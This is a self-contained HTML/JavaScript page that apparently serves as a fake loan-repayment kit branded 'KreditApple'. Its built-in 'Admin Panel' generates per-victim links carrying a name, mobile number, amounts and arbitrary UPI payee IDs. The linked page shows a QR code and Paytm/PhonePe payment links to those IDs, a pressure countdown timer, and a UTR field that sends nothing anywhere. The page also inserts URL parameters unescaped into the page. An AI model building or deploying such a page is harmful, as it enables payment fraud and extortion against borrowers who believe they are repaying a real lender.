<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Order Details - KreditApple</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen m-0">

<div class="w-full max-w-md bg-white shadow-xl min-h-screen flex flex-col justify-between pb-6" id="app"></div>

<script>
const params = new URLSearchParams(window.location.search);
const d = {
  biz: params.get('b') || params.get('biz') || '',
  logo: params.get('l') || params.get('logo') || 'K',
  name: params.get('n') || params.get('name') || 'Customer',
  mobile: params.get('m') || params.get('mobile') || '',
  days: params.get('d') || params.get('days') || '0 Days left',
  date: params.get('dt') || params.get('date') || '2026-11-20',
  ext: params.get('e') || params.get('ext') || '2400',
  full: params.get('f') || params.get('full') || '6000',
  upi1: params.get('u1') || params.get('upi1') || 'bharatpe.90065511470@fbpe',
  upi2: params.get('u2') || params.get('upi2') || '',
  upi3: params.get('u3') || params.get('upi3') || '',
  upi4: params.get('u4') || params.get('upi4') || '',
  upi5: params.get('u5') || params.get('upi5') || ''
};

const app = document.getElementById('app');
let sel = parseInt(params.get('ch') || '1');
let page = params.get('page') || 'home';
let mode = params.get('mode') || 'repay';
let partAmt = parseInt(params.get('amt')) || 5000;
let timerInterval = null;

function getUpis(){
  return [d.upi1, d.upi2, d.upi3, d.upi4, d.upi5];
}

function goPay(m, customAmt){
  const u = new URL(window.location.href);
  u.searchParams.set('page', 'pay');
  u.searchParams.set('mode', m);
  u.searchParams.set('ch', sel);
  if(customAmt){
    u.searchParams.set('amt', customAmt);
  } else {
    u.searchParams.delete('amt');
  }
  window.location.href = u.toString();
}

function goHome(){
  if(timerInterval) clearInterval(timerInterval);
  const u = new URL(window.location.href);
  u.searchParams.delete('page');
  u.searchParams.delete('mode');
  u.searchParams.delete('amt');
  window.location.href = u.toString();
}

function startTimer(duration) {
  let timer = duration, minutes, seconds;
  const display = document.getElementById('countdownTimer');
  if(!display) return;
  
  if(timerInterval) clearInterval(timerInterval);
  timerInterval = setInterval(function () {
    minutes = parseInt(timer / 60, 10);
    seconds = parseInt(timer % 60, 10);
    seconds = seconds < 10 ? "0" + seconds : seconds;
    display.textContent = minutes + " : " + seconds;
    if (--timer < 0) {
      clearInterval(timerInterval);
      display.textContent = "0 : 00";
    }
  }, 1000);
}

function copyUpiId(text, btn) {
  navigator.clipboard.writeText(text);
  btn.innerText = 'COPIED';
  btn.style.backgroundColor = '#16a34a';
  setTimeout(() => {
    btn.innerText = 'COPY';
    btn.style.backgroundColor = '#1976d2';
  }, 2000);
}

function submitPayUtr() {
  const val = document.getElementById('payUtrInput').value.trim();
  if(!val || val.length < 12) {
    alert('Please enter a valid 12-digit UTR / Ref No.');
    return;
  }
  alert('UTR submitted successfully!');
}

function renderApp(){
  if(!d.biz){
    app.innerHTML = `
      <div class="bg-blue-600 text-white px-4 py-4 text-center font-bold text-base shadow">Admin Panel - Link Generator</div>
      <div class="p-4 space-y-3">
        <div>
          <label class="text-xs font-bold block text-gray-700">Business Name</label>
          <input id="biz" value="KreditApple" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
        </div>
        <div>
          <label class="text-xs font-bold block text-gray-700">Logo Letter</label>
          <input id="logo" value="K" maxlength="2" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
        </div>
        <div>
          <label class="text-xs font-bold block text-gray-700">Customer Name</label>
          <input id="name" placeholder="Ahmed Khan" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
        </div>
        <div>
          <label class="text-xs font-bold block text-gray-700">Customer Mobile</label>
          <input id="mobile" placeholder="91750000058" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
        </div>
        <div class="grid grid-cols-2 gap-2">
          <div>
            <label class="text-xs font-bold block text-gray-700">Waiting Text</label>
            <input id="days" value="0 Days left" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
          </div>
          <div>
            <label class="text-xs font-bold block text-gray-700">Repayment Date</label>
            <input id="date" type="date" value="2026-11-20" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
          </div>
        </div>
        <div class="grid grid-cols-2 gap-2">
          <div>
            <label class="text-xs font-bold block text-gray-700">Extension (₹)</label>
            <input id="ext" type="number" value="2400" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
          </div>
          <div>
            <label class="text-xs font-bold block text-gray-700">Full Repay (₹)</label>
            <input id="full" type="number" value="6000" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
          </div>
        </div>
        <div>
          <label class="text-xs font-bold block text-gray-700">Channel 1 UPI</label>
          <input id="upi1" value="bharatpe.90065511470@fbpe" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
        </div>
        <div>
          <label class="text-xs font-bold block text-gray-700">Channel 2 UPI (Opt)</label>
          <input id="upi2" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
        </div>
        <button onclick="makeLink()" class="w-full bg-cyan-700 text-white py-3 rounded-full font-bold mt-3 shadow">Generate Short Link</button>
        <div id="out"></div>
      </div>`;
    return;
  }

  const list = getUpis();
  if(page !== 'pay'){
    let channelsHtml = '';
    for(let i = 1; i <= 5; i++){
      let isActive = (sel === i);
      let hasUpi = list[i-1] ? true : false;
      let bgClass = isActive ? 'bg-blue-500 text-white' : (hasUpi ? 'bg-gray-200 text-gray-700' : 'bg-gray-200 text-gray-400');
      channelsHtml += `<button onclick="sel=${i};renderApp()" class="${bgClass} font-semibold py-3 rounded-xl text-xs">Channel ${i}</button>`;
    }

    app.innerHTML = `
      <div class="flex flex-col min-h-screen justify-between">
        <div>
          <div class="bg-blue-500 text-white px-4 py-3 flex justify-between items-center text-sm font-medium">
            <span>Order Details</span>
          </div>
          <div class="p-4 space-y-4">
            <div class="flex items-center justify-between border-b pb-3">
              <div class="flex items-center space-x-3">
                <div class="bg-emerald-900 text-white font-bold flex items-center justify-center w-12 h-12 rounded-xl text-xl">${d.logo}</div>
                <div>
                  <h2 class="font-bold text-gray-800 text-sm">${d.biz}</h2>
                </div>
              </div>
              <span class="font-bold text-gray-900 text-sm">${d.days}</span>
            </div>

            <div class="text-[13px] space-y-2 border-b pb-3">
              <div class="flex justify-between text-gray-500">
                <span>Account</span>
                <span class="text-gray-800 font-medium">${d.mobile ? '+' + d.mobile : '+91 750****058'}</span>
              </div>
              <div class="flex justify-between text-gray-500">
                <span>Amount You Repay</span>
                <span class="text-gray-900 font-bold">₹${Number(d.full).toLocaleString('en-IN')}</span>
              </div>
              <div class="flex justify-between text-gray-500">
                <span>Repayment Date</span>
                <span class="text-gray-900 font-medium">${d.date}</span>
              </div>
            </div>

            <div class="grid grid-cols-2 gap-3">
              <button onclick="goPay('repay')" class="bg-cyan-700 text-white py-3 px-2 rounded-full font-bold text-sm shadow text-center">
                Repay ₹${d.full}
              </button>
              <button onclick="goPay('extension')" class="bg-cyan-500 text-white py-3 px-2 rounded-full font-bold text-sm shadow text-center">
                Extension ₹${d.ext}
              </button>
            </div>

            <div class="space-y-2 pt-1">
              <label class="text-xs font-semibold text-gray-800">Part Repayment/₹</label>
              <div class="flex items-center justify-between border rounded-full px-4 py-2 bg-white shadow-sm">
                <button onclick="decreasePart()" class="w-7 h-7 rounded-full border border-blue-400 text-blue-500 font-bold">-</button>
                <span id="partAmount" class="font-semibold text-gray-700 text-sm">${partAmt}</span>
                <button onclick="increasePart()" class="w-7 h-7 rounded-full border border-blue-400 text-blue-500 font-bold">+</button>
              </div>
              <button onclick="goPay('part', partAmt)" class="w-full bg-cyan-700 text-white py-3 rounded-full font-bold text-sm shadow">
                Repay ₹<span id="btnPartText">${partAmt}</span>
              </button>
            </div>

            <div class="space-y-2 pt-2">
              <label class="text-xs font-semibold text-gray-800">Repayment Channel</label>
              <div class="grid grid-cols-3 gap-2">${channelsHtml}</div>
            </div>
          </div>
        </div>
      </div>`;
  } else {
    let rawAmt = mode === 'extension' ? d.ext : (mode === 'part' ? partAmt : d.full);
    const upi = list[sel-1] || d.upi1;
    const title = mode === 'repay' ? 'Full Repayment' : (mode === 'extension' ? 'Extension Payment' : 'Part Repayment');
    
    const upiLink = `upi://pay?pa=${encodeURIComponent(upi)}&pn=${encodeURIComponent(d.biz)}&am=${rawAmt}&cu=INR&tn=${encodeURIComponent(title)}`;
    const paytmLink = `paytmmp://pay?pa=${encodeURIComponent(upi)}&pn=${encodeURIComponent(d.biz)}&am=${rawAmt}&cu=INR`;
    const phonepeLink = `phonepe://pay?pa=${encodeURIComponent(upi)}&pn=${encodeURIComponent(d.biz)}&am=${rawAmt}&cu=INR`;
    const qr = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;

    app.innerHTML = `
      <div class="flex flex-col min-h-screen bg-white">
        <div class="bg-[#5b1d99] text-white py-3 px-4 flex items-center justify-center space-x-2 font-semibold text-lg">
          <span>⏱️</span>
          <span id="countdownTimer" class="tracking-wider">7 : 45</span>
        </div>

        <div class="p-4 flex-1 flex flex-col">
          <div class="text-center mt-1">
            <p class="text-gray-700 text-sm font-medium">Amount payable</p>
            <div class="text-[#5b1d99] text-4xl font-extrabold mt-1">₹ ${rawAmt}.00</div>
            <p class="text-gray-700 text-sm font-medium mt-3">Use Mobile Scan code to pay</p>
          </div>

          <div class="my-4 flex justify-center">
            <img src="${qr}" class="w-48 h-48 object-contain">
          </div>

          <div class="mt-1">
            <p class="text-gray-800 text-sm font-medium mb-2.5">Choose a payment method to pay</p>
            <div class="grid grid-cols-2 gap-3">
              <a href="${paytmLink}" class="flex items-center space-x-3 border border-gray-200 rounded-lg px-3 py-2.5 bg-white shadow-sm">
                <span class="font-black text-lg text-blue-900">paytm</span>
              </a>
              <a href="${phonepeLink}" class="flex items-center space-x-2.5 border border-gray-200 rounded-lg px-3 py-2.5 bg-white shadow-sm">
                <div class="w-7 h-7 rounded-full bg-[#5f259f] text-white flex items-center justify-center font-bold">पे</div>
                <span class="text-gray-800 font-medium text-sm">PhonePe</span>
              </a>
            </div>
          </div>

          <div class="mt-5">
            <p class="text-gray-800 text-sm font-medium mb-2">Manual transfer (Copy UPI ID)</p>
            <div class="flex items-center border border-gray-200 rounded-md overflow-hidden">
              <div class="flex-1 px-3 py-2.5 text-gray-800 font-medium text-sm bg-white truncate">${upi}</div>
              <button onclick="copyUpiId('${upi}', this)" class="bg-[#1976d2] text-white font-semibold text-xs px-5 py-3">COPY</button>
            </div>
          </div>

          <div class="mt-4">
            <p class="text-red-600 text-sm font-bold mb-2">Need to enter your 12 Ref No. (UTR)</p>
            <div class="flex items-center border border-gray-200 rounded-md px-3 py-2.5 bg-gray-50">
              <span class="text-red-500 font-bold mr-1">*</span>
              <span class="text-gray-800 font-semibold text-sm mr-2">UTR</span>
              <input type="text" id="payUtrInput" maxlength="12" placeholder="UTR is required" class="w-full text-sm bg-transparent focus:outline-none">
            </div>
          </div>

          <div class="mt-5">
            <button onclick="submitPayUtr()" class="w-full bg-[#1976d2] text-white font-semibold py-3 rounded-full text-base shadow">Submit UTR</button>
          </div>

          <div class="mt-4 text-center">
            <button onclick="goHome()" class="text-xs text-gray-400 underline">Back to Order Details</button>
          </div>
        </div>
      </div>
    `;
    setTimeout(() => startTimer(465), 100);
  }
}

function increasePart(){
  partAmt += 500;
  document.getElementById('partAmount').innerText = partAmt;
  document.getElementById('btnPartText').innerText = partAmt;
}
function decreasePart(){
  if(partAmt > 500){
    partAmt -= 500;
    document.getElementById('partAmount').innerText = partAmt;
    document.getElementById('btnPartText').innerText = partAmt;
  }
}

function makeLink(){
  const b = document.getElementById('biz').value || 'KreditApple';
  const l = document.getElementById('logo').value || 'K';
  const n = document.getElementById('name').value || 'Customer';
  const m = document.getElementById('mobile').value || '';
  const ds = document.getElementById('days').value || '0 Days left';
  const dt = document.getElementById('date').value || '2026-11-20';
  const e = document.getElementById('ext').value || '2400';
  const f = document.getElementById('full').value || '6000';
  const u1 = document.getElementById('upi1').value;
  const u2 = document.getElementById('upi2').value;

  if(!u1){ alert('Channel 1 UPI is required'); return; }

  let link = window.location.origin + window.location.pathname + `?b=${encodeURIComponent(b)}&l=${encodeURIComponent(l)}&n=${encodeURIComponent(n)}&m=${encodeURIComponent(m)}&d=${encodeURIComponent(ds)}&dt=${dt}&e=${e}&f=${f}&u1=${encodeURIComponent(u1)}`;
  if(u2) link += `&u2=${encodeURIComponent(u2)}`;

  document.getElementById('out').innerHTML = `
    <div class="bg-orange-50 border p-3 rounded-lg mt-3 break-all text-xs text-gray-700">${link}</div>
    <button class="w-full bg-blue-600 text-white py-2 rounded-full font-bold mt-2" onclick="navigator.clipboard.writeText('${link}');alert('Copied!')">Copy Link</button>
  `;
}

renderApp();
</script>
</body>
</html>
